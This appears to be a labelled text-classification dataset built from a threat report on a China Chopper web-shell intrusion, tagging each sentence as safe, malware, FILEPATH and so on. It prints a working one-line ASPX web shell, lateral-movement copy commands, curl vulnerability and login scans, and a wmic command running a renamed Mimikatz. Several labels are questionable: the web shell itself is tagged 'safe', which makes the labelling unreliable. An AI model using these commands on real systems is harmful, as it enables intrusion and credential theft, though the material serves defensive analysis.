text: <%@ Page Language="Jscript"%><%eval(Request.Form["Command"],"unsafe");%> We’ve observed that in some cases, malicious actors insert this short script to avoid detection:       Figure 1. A short script
label: safe

text: inserted by malicious actors to avoid detection
label: safe

text: User Activity Checking Once Chopper successfully infects a system, the malicious actor will issue a query user (quser) command in an attempt to identify the primary user or those who are currently logged in as users in the system.
label: malware

text: Based on our observation, the quser command was used routinely throughout the attack to determine active remote sessions.
label: safe

text: Figure 2.
label: safe

text: The quser command is used to identify active remote sessions.
label: safe

text: Deobfuscation technique
label: safe

text: To deploy its tools, it uses the expand command to extract package files dropped in the system.
label: safe

text: expand {filename}.ex_ {filename}.dat expand {filename}.ex_ {filename}.exe
label: safe

text: We saw a noticeable difference with this attack compared to other Chopper attacks — its use of the .dat file extension, which is commonly used for data storage purposes, such as in a user profile’s ntuser.dat.
label: malware

text: In this particular Chopper attack, the .dat files are used as executables.
label: malware

text: Lateral movement
label: attack-pattern

text: It proceeded with copying the Chopper web shell into accessible shared folders in other hosts to gain access.
label: malware

text: copy premium.aspx "\\{hostname}\d$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\15.1.2044\scripts\premium
label: FILEPATH

text: It also scans for vulnerabilities across the network by using an installed tool, Hacktool.Win32.CATLIKE.A, and a legitimate cURL, C:\temp\curl.dat.
label: malware

text: It specifically scans for web server-related vulnerabilities and password weaknesses in Apache Tomcat, Citrix, and phpMyAdmin applications.
label: SOFTWARE

text: Application/Port  Command  Oracle WebLogic  curl.dat -v -H 'Content-Type: text/
label: SOFTWARE

text: xml;charset
label: safe

text: UTF-8
label: safe

text: http://{ip address\]:7001/wls-wsat/CoordinatorPortType  Oracle Console  curl.dat -vv http://{ip address}:7001/console/j_security_check  -d j_username={username}&j_password={password}&submit=Login"
label: FILEPATH

text: PHPMyAdmin  curl.dat -vv --connect-timeout 2 {ip address}/phpmyadmin  Apache Tomcat  s.dat -u http://{ip address}:8080/manager/html  Ports  7001 9095 5556  8080   s.dat -i 10.217.229.189 -p {ports}     Table 1.
label: SOFTWARE

text: Commands used to scan for web server-related vulnerabilities and passwords on certain applications and ports
label: safe

text: We saw that this attack also uses the WMI command line (wmic) utility to perform remote process execution on other infected endpoints.
label: safe

text: Execution of arbitrary commands via session id
label: safe

text: Successful exploitation of CVE-2020-0688 gives Chopper access to system privileges.
label: vulnerability

text: In one of the endpoints, it will drop and execute Trojan.Win32.PRIVESC.A.
label: malware

text: This trojan requires to be run under a user with SeTcbPrivilege.
label: safe

text: It allows an attacker to see all Windows sessions and can execute arbitrary commands on the session via session id.
label: safe

text: Figure 3. Examples of arbitrary commands being performed on the session via session id     Discovery
label: safe

text: For its discovery, it uses typical Windows command-line tools such as nltest, ping, whoami,  netstat, net, nslookup, hostname, and tasklist, which are commonly used in other attacks.
label: tools

text: In addition, a publicly available JoeWare domain tool called LG.exe, which is quite popular among attackers and domain admins alike, was installed and used in the attack.
label: FILEPATH

text: Credential access
label: safe

text: For obtaining user credentials, the attackers used HackTool.MSIL.Mimikatz.AF, a modified version of the open-sourced application Mimikatz, using the following parameters: x, xxx, xxxx, xxxasd. wmic /node:{ip address} process call create "cmd.exe /c c:\users\mpBD6D42.dat xxxasd -pass > c:\users\23.txt  Collection
label: FILEPATH

text: The attackers use wevtutil.exe to query security-related events from a target username and export it as a q.txt file.
label: FILEPATH

text: For packaging stolen credentials and other logs, it uses the makecab command instead of a third-party application such as rar.exe.
label: FILEPATH

text: ·        makecab a.txt > 111 ·        makecab aaa2.txt >1
label: FILEPATH

text: The attacker uses installed security components or applications as filenames to hide in plain sight.
label: safe

text: ·        C:\Program Files\Trend Micro\ ams p.dat ·        C:\Oracle\Oracle.dat ·        C:\Program Files\McAfee\MacAfee.dat These suspicious activities were seen via our XDR solution, which helped us monitor observable attack techniques and provided critical security alerts including anomalous file extension execution, remote execution via system tools, web shell-related activities, and potential exploit attacks.
label: FILEPATH

text: Security recommendations
label: safe

text: Web shells can be embedded in systems via security gaps such as vulnerabilities.
label: attack-pattern

text: Attackers will work to identify vulnerable applications used in systems to exploit them and install web shells for remote code execution or data exfiltration.
label: attack-pattern

text: We provide some security recommendations to ensure that enterprises and organizations can defend against web shell attacks:
label: attack-pattern

text: Patch your systems and applications.
label: safe

text: Ensure proper vulnerability patches are applied for public-facing applications, such as Apache Tomcat, Oracle Web Logic Server, Microsoft Exchange Server, and PHPMyAdmin.
label: SOFTWARE

text: Implement strong passwords.
label: safe

text: Do not use the same password for multiple applications or websites.
label: safe

text: Use multi-factor authentication whenever possible and regularly update it.
label: safe

text: Check for static keys in the IIS web.config file.
label: FILEPATH

text: As observed on CVE-2020-0688, the use of static keys — as opposed to randomly generated keys — can allow an attacker to execute arbitrary code by tricking the server into deserializing ViewState data.
label: vulnerability

text: Enterprises and organizations should have comprehensive and efficient protection, detection, prevention, and remediation based on real-time, higher-confidence alerts to protect critical data and operations from sophisticated attacks and threats.
label: safe

text: A consolidated view of all security sensors provides a single-pane-of-glass view that will promote quick and thorough investigation and response.
label: safe

text: Trend Micro Solutions Trend Micro’s comprehensive XDR solution applies the most effective expert analytics to the deep data sets collected from Trend Micro solutions across the enterprise — including email, endpoints, servers, cloud workloads, and networks — making faster connections to identify and stop attacks.
label: identity

text: Powerful artificial intelligence (AI) and expert security analytics correlate data from customer environments and Trend Micro’s global threat intelligence to deliver fewer, higher-fidelity alerts, leading to better, early detection.
label: identity

text: One console with one source of prioritized, optimized alerts supported with guided investigation simplifies the steps needed to fully understand the attack path and impact on the organization.
label: safe
